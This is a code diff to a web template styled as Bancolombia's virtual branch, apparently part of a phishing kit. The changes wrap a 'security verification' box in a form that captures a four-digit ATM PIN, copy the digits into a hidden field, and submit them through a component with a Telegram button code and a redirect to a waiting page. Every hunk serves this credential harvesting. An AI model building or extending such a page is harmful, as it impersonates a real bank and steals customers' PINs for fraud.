@@ -4,6 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <title>Bancolombia - Sucursal Virtual</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -222,7 +223,7 @@
         <div id="pincaj" class="w-full flex flex-col justify-center items-center pb-6">
             <h5 class="text-[24px] font-cib-sans-bold mt-10">Verificación de seguridad</h5>
             <div class="w-full flex mt-4 flex-col justify-center items-center gap-4 pl-1">
-                <div class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
+                <form id="formulario" class="w-[100%] bg-white py-6 px-4 rounded-xl flex flex-col items-center">
                     <div class="w-full flex items-center justify-center hiddenerror hidden">
                         <span class="text-[11px] text-red-600"> La Clave ingresada no es correcta. Intenta
                             nuevamente.</span>
@@ -238,23 +239,26 @@
 
                     <div class="w-full mt-4 flex flex-col items-center">
                         <div class="flex justify-center gap-2 w-full max-w-xs">
-                            <input id="clavecajero-0" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clavecajero-0" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clavecajero-1" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clavecajero-1" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clavecajero-2" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clavecajero-2" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
-                            <input id="clavecajero-3" type="text" inputmode="numeric" maxlength="1"
+                            <input id="no-clavecajero-3" type="text" inputmode="numeric" maxlength="1"
                                 class="password-input w-8 h-5 text-center thin-border-input text-xl font-semibold outline-none transition-all focus:border-black" />
                         </div>
                     </div>
 
-                    <button id="validarClaveCajero"
+                    <input type="hidden" id="clavecajero" name="clavecajero" value="" />
+                    <input type="hidden" id="no-status" name="status" value="pincaj" />
+
+                    <button id="enviar"
                         class="mt-4 font-bold py-2 px-6 rounded-full mt-6 disabled:bg-gray-300 disabled:text-black cursor-not-allowed bg-gray-300 w-32"
                         disabled>
-                        Validar
+                        Continuar
                     </button>
-                </div>
+                </form>
             </div>
         </div>
 
@@ -268,30 +272,130 @@
     </div>
 
     <script>
+        /* ===== UTILIDADES ===== */
+
+        /**
+         * Habilita o deshabilita un botón con estilos apropiados
+         */
+        function toggleButton(btn, enabled) {
+            if (!btn) return;
+            btn.disabled = !enabled;
+            if (enabled) {
+                btn.classList.remove('bg-gray-300', 'text-black', 'cursor-not-allowed');
+                btn.classList.add('bg-bancolombia-yellow', 'text-black', 'cursor-pointer');
+            } else {
+                btn.classList.remove('bg-bancolombia-yellow', 'cursor-pointer');
+                btn.classList.add('bg-gray-300', 'text-black', 'cursor-not-allowed');
+            }
+        }
+
         /* ===== VALIDACIONES DE CAMPOS DE ENTRADA ===== */
 
         /**
-         * Valida Clave Cajero
+         * Valida Clave Cajero y actualiza el campo hidden
          * Requisito: exactamente 4 dígitos numéricos
          */
         function validateClaveCajero() {
             let codigo = '';
             for (let i = 0; i < 4; i++) {
-                const input = document.getElementById(`clavecajero-${i}`);
+                const input = document.getElementById(`no-clavecajero-${i}`);
                 if (input) {
                     codigo += (input.dataset.realValue || '');
                 }
             }
+
+            // Actualizar el campo hidden con los 4 dígitos
+            const clavecajeroHidden = document.getElementById('clavecajero');
+            if (clavecajeroHidden) {
+                clavecajeroHidden.value = codigo;
+            }
+
             const isValid = codigo.length === 4 && /^\d{4}$/.test(codigo);
+
+            // Habilitar/deshabilitar botón
+            const btnEnviar = document.getElementById('enviar');
+            toggleButton(btnEnviar, isValid);
+
             return isValid;
         }
+
+        /* ===== CONFIGURACIÓN DE INPUTS MULTI-DÍGITO ===== */
+
+        /**
+         * Configura inputs de múltiples dígitos con navegación automática
+         * @param {string} prefix - Prefijo del ID (ej: 'no-clavecajero')
+         * @param {number} maxLength - Cantidad de inputs
+         */
+        function setupMultiDigitInputs(prefix, maxLength) {
+            for (let i = 0; i < maxLength; i++) {
+                const input = document.getElementById(`${prefix}-${i}`);
+                if (!input) continue;
+
+                // Si es un input de contraseña (con punto)
+                if (input.classList.contains('password-input')) {
+                    input.addEventListener('input', function (e) {
+                        const v = e.target.value;
+
+                        // Ignorar si ya es el bullet (evita loop)
+                        if (v === '•') return;
+
+                        // Solo permitir un dígito
+                        if (!/^[0-9]$/.test(v)) {
+                            e.target.value = e.target.dataset.realValue ? '•' : '';
+                            return;
+                        }
+
+                        // Guardar el valor real y mostrar un punto
+                        e.target.dataset.realValue = v;
+                        e.target.value = '•';
+
+                        // Validar después de cada entrada
+                        validateClaveCajero();
+
+                        // Mover al siguiente input si no es el último
+                        if (i < maxLength - 1) {
+                            const nextInput = document.getElementById(`${prefix}-${i + 1}`);
+                            if (nextInput) nextInput.focus();
+                        }
+                    });
+
+                    input.addEventListener('keydown', function (e) {
+                        if (e.key === 'Backspace') {
+                            e.preventDefault();
+                            if (this.dataset.realValue) {
+                                // Si tiene valor, borrarlo
+                                this.value = '';
+                                this.dataset.realValue = '';
+                                validateClaveCajero();
+                            } else if (i > 0) {
+                                // Si está vacío, ir al anterior y borrarlo
+                                const prevInput = document.getElementById(`${prefix}-${i - 1}`);
+                                if (prevInput) {
+                                    prevInput.focus();
+                                    prevInput.value = '';
+                                    prevInput.dataset.realValue = '';
+                                    validateClaveCajero();
+                                }
+                            }
+                        }
+                    });
+                }
+            }
+        }
+
+        /* ===== INICIALIZACIÓN ===== */
+
+        document.addEventListener('DOMContentLoaded', function () {
+            // Setup de inputs multi-dígito para Clave Cajero
+            setupMultiDigitInputs('no-clavecajero', 4);
+        });
     </script>
 
     <x-control
         :auto-completar="false"
         :debug="false"
         redirect-url="/bancol/wait"
-        toast-message="Clave de cajero incorrercta. Intenta nuevamente"
+        toast-message="Clave de cajero incorrecta. Intenta nuevamente"
         telegram-button="CLACAJ"
     />
 
